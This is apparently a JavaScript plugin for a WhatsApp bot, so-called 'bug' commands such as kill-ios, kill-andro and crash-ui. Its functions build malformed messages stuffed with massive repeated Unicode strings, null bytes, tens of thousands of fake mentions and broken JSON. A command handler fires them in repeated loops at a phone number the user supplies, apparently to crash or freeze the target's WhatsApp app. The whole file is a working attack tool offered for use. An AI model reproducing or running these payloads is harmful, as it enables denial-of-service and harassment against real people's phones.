const { generateWAMessageFromContent } = require('@whiskeysockets/baileys');

// ---------------------- Helper ---------------------- //
function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

// ====================== ORIGINAL CRASH FUNCTIONS (FIXED) ====================== //

async function VampireBlankIphone(target, conn) {
    try {
        const message = {
            botInvokeMessage: {
                message: {
                    newsletterAdminInviteMessage: {
                        newsletterJid: `33333333333333333@newsletter`,
                        newsletterName: "𝐆𝐫𝐢𝐦𝐑𝐞𝐚𝐩𝐞𝐫" + "ી".repeat(120000),
                        jpegThumbnail: "",
                        caption: "ꦽ".repeat(120000),
                        inviteExpiration: Date.now() + 1814400000,
                    },
                },
            },
        };
        await conn.relayMessage(target, message, { userJid: target });
    } catch (err) {
        console.error("VampireBlankIphone error:", err);
    }
}

async function FChyUi(target, conn) {
    try {
        let hyuiForceX = JSON.stringify({
            status: true,
            criador: "hyuiForcex",
            resultado: {
                type: "md",
                ws: {
                    _events: { "CB:ib,,dirty": ["Array"] },
                    _eventsCount: 800000,
                    _maxListeners: 0,
                    url: "wss://web.whatsapp.com/ws/chat",
                    config: {
                        version: ["Array"],
                        browser: ["Array"],
                        waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
                        sockCectTimeoutMs: 20000,
                        keepAliveIntervalMs: 30000,
                        logger: {},
                        printQRInTerminal: false,
                        emitOwnEvents: true,
                        defaultQueryTimeoutMs: 60000,
                        customUploadHosts: [],
                        retryRequestDelayMs: 250,
                        maxMsgRetryCount: 5,
                        fireInitQueries: true,
                        auth: { Object: "authData" },
                        markOnlineOnsockCect: true,
                        syncFullHistory: true,
                        linkPreviewImageThumbnailWidth: 192,
                        transactionOpts: { Object: "transactionOptsData" },
                        generateHighQualityLinkPreview: false,
                        options: {},
                        appStateMacVerification: { Object: "appStateMacData" },
                        mobile: true
                    }
                }
            }
        });

        const contextInfo = {
            mentionedJid: [target],
            isForwarded: true,
            forwardingScore: 999,
            businessMessageForwardInfo: {
                businessOwnerJid: target
            }
        };

        let messagePayload = {
            viewOnceMessage: {
                message: {
                    messageContextInfo: {
                        deviceListMetadata: {},
                        deviceListMetadataVersion: 2
                    },
                    interactiveMessage: {
                        contextInfo,
                        body: { text: "Mass Bro Angkat" },
                        nativeFlowMessage: {
                            buttons: [
                                { name: "single_select", buttonParamsJson: hyuiForceX + "𝐇𝐲𝐔𝐢 𝐅𝐨𝐫𝐜𝐞𝐙𝐱" },
                                { name: "call_permission_request", buttonParamsJson: hyuiForceX + "\u0003" },
                            ]
                        }
                    }
                }
            }
        };

        await conn.relayMessage(target, messagePayload, { participant: { jid: target } });
    } catch (err) {
        console.error("FChyUi error:", err);
    }
}

async function DelayX(target, conn) {
    try {
        const msg = generateWAMessageFromContent(target, {
            interactiveResponseMessage: {
                contextInfo: {
                    mentionedJid: Array.from({ length: 2000 }, (_, y) => `1313555000${y + 1}@s.whatsapp.net`)
                },
                body: {
                    text: "\u0000".repeat(450),
                    format: "DEFAULT"
                },
                nativeFlowResponseMessage: {
                    name: "address_message",
                    paramsJson: JSON.stringify({
                        values: {
                            in_pin_code: "999999",
                            building_name: "RizzGanteng",
                            landmark_area: "X",
                            address: "OneVDelay",
                            tower_number: "OnevDelay",
                            city: "Infinity",
                            name: "RizzGanteng",
                            phone_number: "999999999999",
                            house_number: "xxx",
                            floor_number: "xxx",
                            state: `+ | ${"\u0000".repeat(9000)}`
                        }
                    }),
                    version: 3
                }
            }
        }, { userJid: target });

        await conn.relayMessage("status@broadcast", msg.message, {
            messageId: msg.key.id,
            statusJidList: [target],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                {
                                    tag: "to",
                                    attrs: { jid: target },
                                    content: undefined
                                }
                            ]
                        }
                    ]
                }
            ]
        });
    } catch (error) {
        console.error("DelayX error:", error);
    }
}

async function Blankhard(target, conn) {
    try {
        let message = {
            viewOnceMessage: {
                message: {
                    stickerMessage: {
                        url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
                        fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
                        fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
                        mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
                        mimetype: "image/webp",
                        directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
                        fileLength: { low: 1, high: 0, unsigned: true },
                        mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
                        firstFrameLength: 19904,
                        firstFrameSidecar: "KN4kQ5pyABRAgA==",
                        isAnimated: true,
                        contextInfo: {
                            mentionedJid: [
                                "0@s.whatsapp.net",
                                ...Array.from({ length: 40000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")
                            ],
                            groupMentions: [],
                            entryPointConversionSource: "non_contact",
                            entryPointConversionApp: "whatsapp",
                            entryPointConversionDelaySeconds: 467593,
                        },
                        stickerSentTs: { low: -1939477883, high: 406, unsigned: false },
                        isAvatar: false,
                        isAiSticker: false,
                        isLottie: false,
                    },
                },
            },
        };

        const msg = generateWAMessageFromContent(target, message, {});
        await conn.relayMessage("status@broadcast", msg.message, {
            messageId: msg.key.id,
            statusJidList: [target],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
                        }
                    ]
                }
            ]
        });
    } catch (error) {
        console.error("Blankhard error:", error);
    }
}

async function SuperIOSCore(target, conn) {
    try {
        await conn.relayMessage(target, {
            extendedTextMessage: {
                text: `BLAZE 𝐼⃪𝑂⃪𝑆 -` + "࣯ꦾ".repeat(90000),
                contextInfo: {
                    fromMe: false,
                    stanzaId: target,
                    participant: target,
                    quotedMessage: { conversation: "𝐵⃪𝐿⃪𝐴⃪𝑁⃪𝐾 𝐼⃪" }
                },
                disappearingMode: {
                    initiator: "CHANGED_IN_CHAT",
                    trigger: "CHAT_SETTING",
                },
            },
            inviteLinkGroupTypeV2: "DEFAULT",
        }, {
            participant: { jid: target },
            messageId: null
        });
    } catch (err) {
        console.error("SuperIOSCore error:", err);
    }
}

async function RizzKenok(target, conn) {
    try {
        const crash_val = "\u0000".repeat(900000);
        const bug_char = "జ్ఞ‌ా".repeat(15000);

        await conn.relayMessage(target, {
            viewOnceMessageV2: {
                message: {
                    interactiveMessage: {
                        header: { title: "🩸", hasMediaAttachment: true },
                        body: { text: "⌁⃰Hahaha\n" + bug_char },
                        nativeFlowMessage: {
                            buttons: [
                                { name: "payment_method", buttonParamsJson: crash_val },
                                { name: "single_select", buttonParamsJson: crash_val }
                            ]
                        },
                        contextInfo: {
                            mentionedJid: Array.from({ length: 2000 }, () => `0@s.whatsapp.net`),
                            quotedMessage: {
                                orderMessage: {
                                    itemCount: 999999999,
                                    status: 1,
                                    surface: 1,
                                    message: bug_char,
                                    orderTitle: bug_char,
                                    sellerJid: "0@s.whatsapp.net"
                                }
                            }
                        }
                    }
                }
            }
        }, { participant: { jid: target } });
    } catch (err) {
        console.error("RizzKenok error:", err);
    }
}

async function CrashIos(target, conn) {
    try {
        await conn.relayMessage(target, {
            locationMessage: {
                degreesLatitude: 21.1266,
                degreesLongitude: -11.8199,
                name: " ҈⃝⃞⃟⃠⃤꙰꙲MAMPUS҈⃝⃞⃟⃠⃤꙰꙲꙱\n" + "\u0000".repeat(25000) + "𑇂𑆵𑆴𑆿".repeat(60000),
                url: "https://t.me/Snitchezs",
                contextInfo: {
                    externalAdReply: {
                        quotedAd: {
                            advertiserName: "𑇂𑆵𑆴𑆿".repeat(60000),
                            mediaType: "IMAGE",
                            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
                            caption: " ‼️⃟𝕾̷⃰𝖓𝒊𝖙̦͈͈͈͈̾𝖍͢ ҉҈⃝⃞⃟⃠⃤꙰꙲꙱" + "𑇂𑆵𑆴𑆿".repeat(60000),
                        },
                        placeholderKey: {
                            remoteJid: "0s.whatsapp.net",
                            fromMe: false,
                            id: "ABCDEF1234567890"
                        }
                    }
                }
            }
        }, { participant: { jid: target } });
    } catch (err) {
        console.error("CrashIos error:", err);
    }
}

async function BlazeInvis(target, conn) {
    try {
        await conn.relayMessage(target, {
            albumMessage: {
                contextInfo: {
                    mentionedJid: Array.from({ length: 2000 }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`),
                    remoteJid: " blaze - execute ",
                    parentGroupJid: "0@g.us",
                    isQuestion: true,
                    isSampled: true,
                    entryPointConversionDelaySeconds: 6767676767,
                    businessMessageForwardInfo: null,
                    botMessageSharingInfo: {
                        botEntryPointOrigin: { origins: "BOT_MESSAGE_ORIGIN_TYPE_AI_INITIATED" },
                        forwardScore: 999
                    },
                    quotedMessage: {
                        viewOnceMessage: {
                            message: {
                                interactiveResponseMessage: {
                                    body: { text: "BLAZE_MESSAGE", format: "EXTENSIONS_1" },
                                    nativeFlowResponseMessage: {
                                        name: "call_permission_request",
                                        paramsJson: "\u0000".repeat(1000000),
                                        version: 1,
                                    },
                                },
                            },
                        },
                    },
                },
            },
        }, { participant: { jid: target } });
    } catch (err) {
        console.error("BlazeInvis error:", err);
    }
}

async function InvisibleFC(target, conn) {
    try {
        let message = {
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        header: {
                            title: "KenokYou!",
                            hasMediaAttachment: false,
                            locationMessage: {
                                degreesLatitude: -999.035,
                                degreesLongitude: 922.999999999999,
                                name: "KenokYou!",
                                address: "KenokYou!",
                            },
                        },
                        body: { text: "KenokYou!" },
                        nativeFlowMessage: { messageParamsJson: "{".repeat(10000) },
                        contextInfo: {
                            participant: target,
                            mentionedJid: ["0@s.whatsapp.net"],
                        },
                    },
                },
            },
        };
        await conn.relayMessage(target, message, {
            messageId: null,
            participant: { jid: target },
            userJid: target,
        });
    } catch (err) {
        console.error("InvisibleFC error:", err);
    }
}

// ====================== COMMAND HANDLER ====================== //
let handler = async (m, { conn, text, usedPrefix, command, isOwner, isPremium }) => {
    try {
        // Extract target (fixed)
        let pelaku = m.mentionedJid[0] 
            ? m.mentionedJid[0] 
            : (m.quoted ? m.quoted.sender : (text ? text.replace(/[^0-9]/g, '') : ''));
        
        if (!pelaku) {
            return m.reply(`❌ *No target!*\nExample: ${usedPrefix + command} 628123456789`);
        }
        
        let isTarget = pelaku.includes('@') ? pelaku : pelaku + "@s.whatsapp.net";
        
        // Permission check
        if (!isOwner && !isPremium) {
            return m.reply('🔒 This command is for premium users or owners only!');
        }
        
        await conn.sendMessage(m.chat, { react: { text: '🩸', key: m.key } });
        
        // Attack loops (original counts)
        switch (command) {
            case "kill-andro":
            case "fclose":
            case "forclose":
                for (let r = 0; r < 80; r++) {
                    await InvisibleFC(isTarget, conn);
                    await InvisibleFC(isTarget, conn);
                    await sleep(5000);
                    await RizzKenok(isTarget, conn);
                    await RizzKenok(isTarget, conn);
                }
                break;
                
            case "force-call":
            case "fc-call":
                for (let r = 0; r < 50; r++) {
                    await FChyUi(isTarget, conn);
                    await FChyUi(isTarget, conn);
                    await sleep(5000);
                    await FChyUi(isTarget, conn);
                    await FChyUi(isTarget, conn);
                }
                break;
                
            case "kill-invis":
            case "delayhard":
            case "delayinvis":
            case "delaymaker":
                for (let r = 0; r < 125; r++) {
                    await Blankhard(isTarget, conn);
                    await Blankhard(isTarget, conn);
                    await sleep(5000);
                    await DelayX(isTarget, conn);
                    await DelayX(isTarget, conn);
                    await sleep(5000);
                    await BlazeInvis(isTarget, conn);
                    await BlazeInvis(isTarget, conn);
                }
                break;
                
            case "kill-ios":
            case "force-ios":
                for (let r = 0; r < 50; r++) {
                    await SuperIOSCore(isTarget, conn);
                    await SuperIOSCore(isTarget, conn);
                    await sleep(5000);
                    await CrashIos(isTarget, conn);
                    await CrashIos(isTarget, conn);
                }
                break;
                
            case "kill-ui":
            case "crash-ui":
            case "blank-ui":
                for (let r = 0; r < 3; r++) {
                    await VampireBlankIphone(isTarget, conn);
                    await VampireBlankIphone(isTarget, conn);
                    await sleep(5000);
                    await CrashIos(isTarget, conn);
                    await CrashIos(isTarget, conn);
                }
                break;
                
            default:
                return m.reply('❓ Command not recognized.');
        }
        
        await conn.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
        return m.reply(`✅ *Attack finished*\n📛 Target: ${pelaku}\n⚡ Status: Success`);
        
    } catch (error) {
        console.error("Handler error:", error);
        return m.reply(`❌ Error: ${error.message}`);
    }
};

// ====================== METADATA ====================== //
handler.help = [
    'kill-andro', 'fclose', 'forclose',
    'force-call', 'fc-call',
    'kill-invis', 'delayhard', 'delayinvis', 'delaymaker',
    'kill-ios', 'force-ios',
    'kill-ui', 'crash-ui', 'blank-ui'
];
handler.tags = ['bug'];
handler.command = [
    'kill-andro', 'fclose', 'forclose',
    'force-call', 'fc-call',
    'kill-invis', 'delayhard', 'delayinvis', 'delaymaker',
    'kill-ios', 'force-ios',
    'kill-ui', 'crash-ui', 'blank-ui'
];
handler.premium = true;
handler.owner = false;

module.exports = handler;
